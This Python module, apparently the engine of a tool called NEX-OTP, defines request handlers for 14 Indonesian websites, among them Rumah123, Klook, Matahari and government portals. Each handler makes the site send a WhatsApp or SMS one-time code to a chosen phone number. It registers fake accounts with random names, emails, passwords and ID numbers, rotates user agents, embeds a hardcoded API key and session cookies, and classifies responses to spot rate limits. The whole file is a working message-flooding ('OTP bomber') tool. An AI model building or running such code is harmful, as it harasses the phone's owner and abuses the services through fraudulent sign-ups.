# -*- coding: utf-8 -*-
"""
OTP Engine for NEX-OTP Web & CLI
Contains platform definitions, phone normalization, user agent generator, and request handlers.
"""

import os
import sys
import time
import uuid
import random
import string
import threading
import requests

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
]

def ua():
    return random.choice(USER_AGENTS)

def normalize(phone):
    """Normalisasi ke format 62xxx"""
    if not phone:
        return ''
    n = str(phone).strip().replace(' ', '').replace('-', '').replace('+', '')
    if n.startswith('08'):
        return '62' + n[1:]
    if n.startswith('8'):
        return '62' + n
    if n.startswith('62'):
        return n
    return ''

def fmt08(p):
    return '0' + p[2:] if p.startswith('62') else p

def fmtplus(p):
    return '+' + p if not p.startswith('+') else p

def fmtphone(p):
    if p.startswith('62'):
        return p[2:]
    if p.startswith('+62'):
        return p[3:]
    if p.startswith('0'):
        return p[1:]
    return p

def rnd_name():
    return 'User' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))

def rnd_email():
    return f"{''.join(random.choices(string.ascii_lowercase, k=7))}{random.randint(100,999)}@gmail.com"

IP_CACHE = {"ip": None, "done": threading.Event()}

def _fetch_ip():
    try:
        IP_CACHE["ip"] = requests.get('https://api.ipify.org', timeout=5).text.strip()
    except Exception:
        IP_CACHE["ip"] = '127.0.0.1'
    IP_CACHE["done"].set()

def get_ip():
    if IP_CACHE["ip"]:
        return IP_CACHE["ip"]
    if not IP_CACHE["done"].is_set():
        IP_CACHE["done"].wait(0.3)
    return IP_CACHE["ip"] or '127.0.0.1'

# Start IP fetch background thread at module import
threading.Thread(target=_fetch_ip, daemon=True).start()

# ============================================================
# OTP HANDLERS (WhatsApp Channel)
# ============================================================

def otp_internetrakyat(p62):
    """Internet Rakyat - x-api-key static"""
    url = "https://internetrakyat.id/api/app/auth/send-otp-register"
    headers = {
        "User-Agent": ua(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "x-api-key": "280999!FTTH",
        "Origin": "https://internetrakyat.id",
        "Referer": "https://internetrakyat.id/auth/register",
    }
    payload = {"phone_number": fmt08(p62)}
    try:
        return requests.post(url, headers=headers, json=payload, timeout=15)
    except Exception:
        return None

def otp_auto2000(p62):
    """Auto2000 - OTP WhatsApp"""
    url = "https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp"
    headers = {
        "User-Agent": ua(),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://auto2000.co.id",
        "Referer": "https://auto2000.co.id/login",
    }
    cookies = {
        "system_token": "UeRmUjEnH5N9FEWf1lEAFDqcJ9w",
        "__Host-next-auth.csrf-token": "244fc48aa5bc0f4b221efb6180f81783a8409eb97d7cfbd1862417ecd5e3f828%7Cafcb5605ff19e76229c125b9ddfbee2431be4cf7c369c743bec3e911e920cd22",
        "__Secure-next-auth.callback-url": "https%3A%2F%2Fauto2000.co.id",
    }
    payload = {
        "phoneNumber": fmt08(p62),
        "isCheckOtpLimit": True,
        "uniqueID": fmt08(p62),
        "isLogin": False,
    }
    try:
        return requests.post(url, headers=headers, cookies=cookies, json=payload, timeout=15)
    except Exception:
        return None

def otp_sidemang(p62):
    """SIDEMANG Palembang - WA OTP"""
    url = "https://sidemang.palembang.go.id/api/users/register/send-otp"
    headers = {
        "User-Agent": ua(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://sidemang.palembang.go.id",
        "Referer": "https://sidemang.palembang.go.id/lambidaro/register-otp",
    }
    payload = {"phoneNumber": fmt08(p62), "email": rnd_email()}
    try:
        return requests.post(url, headers=headers, json=payload, timeout=15)
    except Exception:
        return None

def otp_ptsp_kemenag(p62):
    """PTSP Kemenag - WA OTP register"""
    url = "https://dev-ptsp.kemenag.go.id/api/auth/register"
    headers = {
        "User-Agent": ua(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://dev-ptsp.kemenag.go.id",
        "Referer": "https://dev-ptsp.kemenag.go.id/login",
    }
    digits = ''.join(random.choices(string.digits, k=3))
    letters = ''.join(random.choices(string.ascii_letters, k=3))
    payload = {
        "nama": rnd_name(),
        "wa": fmt08(p62),
        "email": rnd_email(),
        "password": 'Pass' + digits + letters + '$',
    }
    try:
        return requests.post(url, headers=headers, json=payload, timeout=15)
    except Exception:
        return None

def otp_hrsbre(p62):
    """HRS-BRE - register multipart -> OTP WA"""
    sess = requests.Session()
    base = "https://career.hrs-bre.site"
    h = {"User-Agent": ua(), "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept-Language": "id-ID,id;q=0.9", "Origin": base, "Referer": f"{base}/auth/sign_up"}
    try:
        g = sess.get(f"{base}/auth/sign_up", headers={"User-Agent": ua()}, timeout=15)
        if g.status_code != 200:
            return g
    except Exception:
        return None
    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    nik = ''.join(random.choices(string.digits, k=16))
    pw = "Aa1" + ''.join(random.choices(string.ascii_letters + string.digits, k=7))
    body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"nik\"\r\n\r\n{nik}\r\n"
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n{rnd_email()}\r\n"
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"whatsapp\"\r\n\r\n{fmt08(p62)}\r\n"
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n{''.join(random.choices(string.ascii_letters, k=8))}\r\n"
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n{pw}\r\n"
            f"--{boundary}--\r\n")
    h["Content-Type"] = f"multipart/form-data; boundary={boundary}"
    try:
        return sess.post(f"{base}/auth/sign_up_action", headers=h, data=body, timeout=15)
    except Exception:
        return None

def otp_rumah123(p62):
    """Rumah123 - OTP WhatsApp"""
    url = "https://www.rumah123.com/api/otp/request-otp"
    headers = {
        "User-Agent": ua(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "https://www.rumah123.com",
        "Referer": "https://www.rumah123.com/user/login",
        "base-url-core": "https://www.rumah123.com",
    }
    payload = {
        "cancelledRequestId": str(uuid.uuid4()),
        "ipAddress": get_ip(),
        "phoneNumber": p62,
        "portalId": 1,
        "type": "WHATSAPP",
        "url": "https://www.rumah123.com/user/login?redirect=%2Fcustomer%2Fv3%2Fpasang-iklan%2F",
    }
    try:
        return requests.post(url, headers=headers, json=payload, timeout=15)
    except Exception:
        return None

def otp_paper(p62):
    """Paper.id - OTP WhatsApp"""
    url = "https://register.paper.id/api/v1/auth/register/send-otp"
    headers = {
        "User-Agent": ua(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://paper.id",
        "x-paper-user-agent": "multiverse/2.54.1 mobile_web (android) chrome",
    }
    payload = {"phone": p62, "method": "whatsapp", "registered_by": "flutter mweb"}
    try:
        return requests.post(url, headers=headers, json=payload, timeout=15)
    except Exception:
        return None

def otp_duniagames(p62):
    """Dunia Games - OTP via SMS/WA"""
    url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
    headers = {
        "User-Agent": ua(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://duniagames.co.id",
        "x-device": "85d3da46-4d56-4675-90fc-e27926c56de1",
    }
    payload = {"phoneNumber": fmtplus(p62), "userName": fmtphone(p62)}
    try:
        return requests.post(url, headers=headers, json=payload, timeout=15)
    except Exception:
        return None

def otp_bonusbelanja(p62):
    """Bonus Belanja - register OTP"""
    url = "https://www.bonusbelanja.com/api/auth/registration/app"
    headers = {
        "User-Agent": ua(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://www.bonusbelanja.com",
        "Referer": "https://www.bonusbelanja.com/register/",
    }
    payload = {"phone": p62, "name": "User", "agreeTnc": True, "agreeContact": True}
    try:
        return requests.post(url, headers=headers, json=payload, timeout=15)
    except Exception:
        return None

def otp_matahari(p62):
    """Matahari - register OTP WA"""
    url = "https://matahari-backend-prod.matahari.com/api/auth/register"
    headers = {
        "User-Agent": ua(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://matahari.com",
    }
    payload = {
        "emailAddress": rnd_email(),
        "name": "User",
        "mobileCountryCode": "",
        "mobileNumber": fmt08(p62),
        "birthDate": "2000-01-01",
        "genderId": "1",
        "password": 'Pass' + ''.join(random.choices(string.ascii_letters + string.digits, k=6)) + '@1',
        "cardNumber": "",
        "referralCode": "",
        "salesmanId": "",
        "pickupStoreCode": "",
        "marketingCode": "",
    }
    try:
        return requests.post(url, headers=headers, json=payload, timeout=15)
    except Exception:
        return None

def otp_klook(p62):
    """Klook - OTP WhatsApp"""
    url = "https://www.klook.com/v2/userapisrv/public/verification/code/send?trace_id=" + str(uuid.uuid4())
    headers = {
        "User-Agent": ua(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "x-platform": "mobile",
        "x-klook-market": "global",
        "version": "5.6",
        "Origin": "https://www.klook.com",
        "Referer": "https://www.klook.com/en-SG/signin/?aid=87721",
    }
    payload = {
        "action": "login_register",
        "type": 1,
        "rcv": fmtplus(p62),
        "is_resend": False,
        "payload": {"mobile": fmtplus(p62), "term_ids": [330], "mobile_token": "", "invite_code": ""},
        "_rc": "",
        "rcv_token": "",
    }
    try:
        return requests.post(url, headers=headers, json=payload, timeout=15)
    except Exception:
        return None

def otp_planetban(p62):
    """PlanetBan - OTP WA"""
    url = "https://api.planetban.com/website/customer/request-otp"
    headers = {
        "Content-Type": "application/json",
        "Origin": "https://planetban.com",
        "Referer": "https://planetban.com/register",
        "User-Agent": ua(),
        "Accept": "application/json, text/plain, */*",
    }
    payload = {
        "name": rnd_name(),
        "phone": fmt08(p62),
        "email": rnd_email(),
        "password": "Pass" + ''.join(random.choices(string.digits, k=4)) + "!",
        "purpose": "register",
        "channel": "whatsapp",
        "method": "whatsapp"
    }
    try:
        return requests.post(url, headers=headers, json=payload, timeout=15)
    except Exception:
        return None

def otp_tuneup(p62):
    """TuneUp - OTP WA channel whatsapp"""
    url = "https://api.tuneup.id/v1/mitra/register/send-otp"
    headers = {
        "Origin": "https://dashboard.tuneup.id",
        "Referer": "https://dashboard.tuneup.id/",
        "User-Agent": ua(),
        "Accept": "application/json, text/plain, */*",
    }
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    data = {
        "company_name": "PT " + name.capitalize(),
        "owner_name": name.capitalize(),
        "address": ''.join(random.choices(string.ascii_letters + string.digits, k=10)),
        "email": name + "@mailnesia.com",
        "phone_number": fmt08(p62),
        "province_code": "32",
        "city_code": "32.04",
        "subscription_id": "undefined",
        "channel": "whatsapp",
        "agreement": "true",
        "service_categories[]": "3",
    }
    try:
        return requests.post(url, data=data, headers=headers, timeout=15)
    except Exception:
        return None

def otp_hainaya(p62):
    """Hainaya - register bisnis -> OTP WA"""
    reg_url = "https://app.hainaya.id/api/onboarding/register"
    headers = {
        "User-Agent": ua(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://app.hainaya.id",
        "Referer": "https://app.hainaya.id/onboard",
    }
    prefix = random.choice(['Tst', 'Coba', 'Uji', 'Test', 'Demo', 'Sample', 'Bisnis'])
    mid = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6)))
    bname = prefix + mid.capitalize() + str(random.randint(10, 999))
    ph = fmt08(p62)
    payload = {
        "business_name": bname,
        "vertical": "salon",
        "vendor_type": "nail_salon",
        "business_phone": ph,
        "owner_name": rnd_name(),
        "owner_phone": ph,
        "channel": "whatsapp"
    }
    try:
        r = requests.post(reg_url, headers=headers, json=payload, timeout=15)
        if r.status_code in (403, 409):
            h2 = {k: v for k, v in headers.items()}
            h2["Referer"] = "https://app.hainaya.id/login"
            return requests.post("https://app.hainaya.id/api/auth/login", headers=h2,
                                 json={"phone_number": ph, "channel": "whatsapp"}, timeout=15)
        return r
    except Exception:
        return None

# ============================================================
# PLATFORM REGISTRY
# ============================================================

PLATFORMS = [
    ("Internet Rakyat", otp_internetrakyat),
    ("PTSP Kemenag",    otp_ptsp_kemenag),
    ("HRS-BRE",         otp_hrsbre),
    ("Rumah123",        otp_rumah123),
    ("Paper",           otp_paper),
    ("DuniaGames",      otp_duniagames),
    ("BonusBelanja",    otp_bonusbelanja),
    ("Matahari",        otp_matahari),
    ("Auto2000",        otp_auto2000),
    ("SIDEMANG",        otp_sidemang),
    ("Klook",           otp_klook),
    ("PlanetBan",       otp_planetban),
    ("TuneUp",          otp_tuneup),
    ("Hainaya",         otp_hainaya),
]

def verdict(resp):
    """Hasil klasifikasi respons server"""
    if resp is None:
        return "TIMEOUT", "gagal konek / timeout 15s"
    code = resp.status_code
    body = (resp.text or "")[:200].replace('\r', ' ').replace('\n', ' ')
    low = body.lower()
    if any(k in low for k in ["rate limit", "too many", "limit", "exceeded", "banned", "blocked", "tunggu 1x24"]):
        return "LIMIT", f"({code}) {body[:60]}"
    if code in (200, 201, 202):
        return "SUCCESS", f"({code}) ok"
    return "FAIL", f"({code}) {body[:50]}"
